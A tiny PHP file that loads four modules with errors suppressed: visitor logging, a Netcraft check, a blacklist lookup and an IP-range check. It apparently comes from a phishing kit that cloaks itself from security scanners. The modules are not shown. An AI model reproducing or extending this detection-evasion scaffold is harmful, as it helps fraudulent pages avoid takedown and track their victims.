<?php  
@require "AMG/visitor_log.php";
@require "AMG/netcraft_check.php";
@require "AMG/blacklist_lookup.php";
@require "AMG/ip_range_check.php";
?>